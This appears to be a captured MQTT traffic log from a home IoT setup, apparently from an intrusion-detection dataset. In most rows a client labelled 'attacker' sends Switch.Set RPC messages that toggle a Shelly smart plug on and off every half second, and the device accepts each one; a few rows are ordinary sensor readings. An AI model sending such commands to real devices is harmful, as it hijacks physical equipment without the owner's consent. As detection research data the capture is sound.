2026-04-22T16:18:11,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33224.38,""swi"
2026-04-22T16:18:11,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3650 33224.406 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:12,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:12,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3651 33224.888 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:12,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:12,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33224.88,""swi"
2026-04-22T16:18:12,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3652 33224.904 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:12,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:12,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3653 33225.388 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:12,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:12,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33225.39,""swi"
2026-04-22T16:18:12,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3654 33225.407 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:13,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:13,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:13,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3655 33225.889 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:13,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:13,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33225.89,""swi"
2026-04-22T16:18:13,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3656 33225.905 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:13,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:13,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:13,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3657 33226.390 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:13,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:13,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33226.39,""swi"
2026-04-22T16:18:13,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3658 33226.408 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:14,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:14,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:14,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3659 33226.890 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:14,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:14,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33226.89,""swi"
2026-04-22T16:18:14,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3660 33226.906 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:14,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:18:14,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:14,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:14,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3661 33227.391 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:14,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:18:14,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:14,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33227.39,""swi"
2026-04-22T16:18:14,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3662 33227.409 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:15,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:15,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:15,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3663 33227.891 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:15,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:15,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33227.89,""swi"
2026-04-22T16:18:15,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3664 33227.909 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:15,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:15,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:15,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3665 33228.392 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:15,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:15,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33228.39,""swi"
2026-04-22T16:18:15,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3666 33228.410 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:16,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:16,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:16,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3667 33228.892 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:16,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:16,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33228.89,""swi"
2026-04-22T16:18:16,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3668 33228.908 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:18:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:18:16,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:18:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:18:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:18:16,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:16,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:16,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3669 33229.394 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:16,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:16,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33229.39,""swi"
2026-04-22T16:18:16,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3670 33229.415 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:17,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:17,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:17,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3671 33229.893 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:17,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:17,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33229.89,""swi"
2026-04-22T16:18:17,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3672 33229.910 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:17,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:17,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:17,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3673 33230.396 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:17,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:17,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33230.39,""swi"
2026-04-22T16:18:17,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3674 33230.414 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:18,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:18,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:18,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3675 33230.897 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:18,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:18,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33230.89,""swi"
2026-04-22T16:18:18,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3676 33230.914 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:18,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:18,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:18,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3677 33231.398 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:18,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:18,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33231.39,""swi"
2026-04-22T16:18:18,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3678 33231.416 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:19,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:19,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:19,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3679 33231.898 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:19,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:19,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33231.90,""swi"
2026-04-22T16:18:19,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3680 33231.915 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:19,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:18:19,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:19,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:18:19,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:19,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3681 33232.401 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:19,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:19,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33232.40,""swi"
2026-04-22T16:18:19,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3682 33232.419 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:20,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:20,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:20,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3683 33232.900 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:20,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:20,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33232.90,""swi"
2026-04-22T16:18:20,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3684 33232.916 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:20,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:20,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:20,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3685 33233.400 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:20,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:20,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33233.40,""swi"
2026-04-22T16:18:20,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3686 33233.419 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:21,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:21,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:21,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3687 33233.901 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:21,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:21,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33233.90,""swi"
2026-04-22T16:18:21,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3688 33233.917 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:21,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:21,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:21,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3689 33234.401 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:21,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:21,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33234.40,""swi"
2026-04-22T16:18:21,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3690 33234.419 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:22,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:22,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:22,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3691 33234.901 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:22,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:22,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33234.90,""swi"
2026-04-22T16:18:22,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3692 33234.918 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:22,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:22,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:22,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3693 33235.402 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:22,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:22,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33235.40,""swi"
2026-04-22T16:18:22,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3694 33235.421 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:23,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:23,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3695 33235.903 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:23,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:23,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33235.90,""swi"
2026-04-22T16:18:23,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3696 33235.919 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:23,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:23,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3697 33236.403 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:23,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:23,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33236.40,""swi"
2026-04-22T16:18:23,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3698 33236.422 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:24,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:24,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3699 33236.906 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:24,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:24,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33236.90,""swi"
2026-04-22T16:18:24,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3700 33236.923 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:24,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:18:24,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:24,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3701 33237.404 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:24,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:18:24,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
